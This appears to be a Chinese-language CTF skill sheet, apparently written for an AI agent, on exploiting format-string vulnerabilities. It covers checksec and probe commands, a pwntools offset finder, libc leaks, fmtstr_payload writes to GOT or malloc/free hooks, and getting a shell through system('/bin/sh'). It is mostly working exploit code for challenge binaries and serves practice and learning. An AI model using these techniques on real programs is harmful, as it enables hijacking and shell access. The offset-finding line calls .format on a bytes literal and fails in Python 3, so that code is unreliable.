---
name: pwn/format-string
description: 格式化字符串漏洞：偏移定位、任意读、任意写、getshell
when_to_use: 程序把用户输入直接当 printf/fprintf 的格式串；能泄露栈、%n 可写
categories: [pwn]
keywords: [fmtstr, format string, %p, %n, printf, 格式化]
---
## 快速判定

```bash
checksec ./chal          # 看 PIE / RELRO / canary
./chal <<< '%p.%p.%p.%p.%p.%p'
```
能回显 `0x...` 就是 fmtstr。64 位前 6 个参数在寄存器（rdi rsi rdx rcx r8 r9），
第 7 个起才在栈上，所以偏移通常从 `%6$p` 开始试。

## 找偏移

```python
from pwn import *
p = process('./chal')
p.sendline(b'AAAA.' + b'.'.join(b'%{}$p'.format(i) for i in range(1, 40)))
print(p.recvall(timeout=2))
```
输出里出现 `0x41414141` / `0x4141414141414141` 的那个下标就是偏移。

## 泄露 libc

```
%{off}$s      # 若栈上有指向 got 的指针
%{off}$p      # 泄漏返回地址 / libc 地址
```
拿到 libc 地址后：`libc.address = leak - libc.symbols['printf']`，
再 `system('/bin/sh')`。注意 64 位只打印到 `\x00` 为止，需要拼两次泄露。

## 任意写（%n 家族）

```python
payload = fmtstr_payload(offset, {target: value}, write_size='short')
```
- `write_size='byte'` 最稳（不会出现 `%99999999c` 超时）
- 目标常是 GOT（无 Full RELRO）或 `__malloc_hook` / `__free_hook` / 返回地址
- 栈上写返回地址需要先知道栈地址（再用一次 `%p` 泄）

## 常见坑

- 沙箱里 `%s` 遇到坏指针会崩，先用 `%p` 探。
- `sendline` 引入的换行会占一个位置，算偏移时别忘。
- 一交就崩多半是 `%n` 写错宽度；先用 `%hn` 只写 2 字节试。
